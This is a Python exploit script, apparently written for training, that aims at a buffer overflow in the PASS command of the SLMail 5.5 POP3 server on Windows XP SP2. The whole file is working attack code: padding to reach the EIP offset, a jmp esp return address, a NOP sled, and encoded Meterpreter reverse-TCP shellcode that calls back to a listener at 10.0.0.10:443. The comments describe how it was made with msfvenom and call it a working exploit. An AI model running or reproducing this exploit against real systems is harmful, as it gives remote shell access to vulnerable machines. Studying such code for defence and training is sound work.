#!/usr/bin/env python
# cccgoe 02.06.2015 - buffer overflow exploitation basics
# injecting reverse tcp shell payload generated by metasploit
# make sure to have a exploit/multi/handler listening on IP 10.0.0.10 
# at port 443 with the correct payload settings
# if the ip adresses differ it is required to generate a new payload
# or search the ip in the assembly and patch it manually ;)
# This is a working exploit for SLMail 5.5 on Windows XP SP2!

#import socket library
import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP with address to jmp esp instruction in slmfc.dll at 5F4A358F ---little endian---> \x8f\x35\x4a\x5f
EIP = '\x8f\x35\x4a\x5f'

# place NOP's in exploit variable for demonstration purposes
nop = '\x90' * 10

#badchars = \x00\x0a\x0d
# \x00 = stringterminator
# \x0a = linefeed
# \x0f = carriage return

# msfvenom will create the payload and encode it to remove bad characters 
# using the polymorhpic encoder shikata_ga_nai which will create a uniqe 
# payload each time you call msfvenom

# msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=thread LHOST=10.0.0.10 LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 347 (iteration=0)
buf =  ""
buf += "\xda\xd6\xd9\x74\x24\xf4\x58\xbb\xbc\xe2\xbd\x46\x29"
buf += "\xc9\xb1\x51\x83\xe8\xfc\x31\x58\x13\x03\xe4\xf1\x5f"
buf += "\xb3\xe8\x1e\x1d\x3c\x10\xdf\x42\xb4\xf5\xee\x42\xa2"
buf += "\x7e\x40\x73\xa0\xd2\x6d\xf8\xe4\xc6\xe6\x8c\x20\xe9"
buf += "\x4f\x3a\x17\xc4\x50\x17\x6b\x47\xd3\x6a\xb8\xa7\xea"
buf += "\xa4\xcd\xa6\x2b\xd8\x3c\xfa\xe4\x96\x93\xea\x81\xe3"
buf += "\x2f\x81\xda\xe2\x37\x76\xaa\x05\x19\x29\xa0\x5f\xb9"
buf += "\xc8\x65\xd4\xf0\xd2\x6a\xd1\x4b\x69\x58\xad\x4d\xbb"
buf += "\x90\x4e\xe1\x82\x1c\xbd\xfb\xc3\x9b\x5e\x8e\x3d\xd8"
buf += "\xe3\x89\xfa\xa2\x3f\x1f\x18\x04\xcb\x87\xc4\xb4\x18"
buf += "\x51\x8f\xbb\xd5\x15\xd7\xdf\xe8\xfa\x6c\xdb\x61\xfd"
buf += "\xa2\x6d\x31\xda\x66\x35\xe1\x43\x3f\x93\x44\x7b\x5f"
buf += "\x7c\x38\xd9\x14\x91\x2d\x50\x77\xfe\x82\x59\x87\xfe"
buf += "\x8c\xea\xf4\xcc\x13\x41\x92\x7c\xdb\x4f\x65\x82\xf6"
buf += "\x28\xf9\x7d\xf9\x48\xd0\xb9\xad\x18\x4a\x6b\xce\xf2"
buf += "\x8a\x94\x1b\x54\xda\x3a\xf4\x15\x8a\xfa\xa4\xfd\xc0"
buf += "\xf4\x9b\x1e\xeb\xde\xb3\xb5\x16\x89\xb1\x49\x18\x43"
buf += "\xae\x4b\x18\x52\x95\xc5\xfe\x3e\xf9\x83\xa9\xd6\x60"
buf += "\x8e\x21\x46\x6c\x04\x4c\x48\xe6\xad\xb1\x07\x0f\xc7"
buf += "\xa1\x70\x30\x27\x39\x81\x25\x27\x53\x85\xef\x70\xcb"
buf += "\x87\xd6\xb7\x54\x77\x3d\xc4\x92\x87\xc0\x22\xe9\xbe"
buf += "\x56\xf5\x85\xbe\xb6\xf5\x55\xe9\xdc\xf5\x3d\x4d\x85"
buf += "\xa5\x58\x92\x10\xda\xf1\x07\x9b\x8b\xa6\x80\xf3\x31"
buf += "\x91\xe7\x5b\xc9\xf4\x7b\x9b\x35\x88\xb8\x5d\xf5\x5d"
buf += "\xf9\x2b\x10\x5e\xbe\x34\xff\x4a\xcb\xdc\xa6\x1f\x76"
buf += "\x81\x58\xca\xb5\xbc\xda\xfe\x45\x3b\xc2\x8b\x40\x07"
buf += "\x44\x60\x39\x18\x21\x86\xee\x19\x60"

buffer = padding + EIP + nop + buf

# exception handler
try:
	print '\nSending buffer...'
	s.connect (('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'


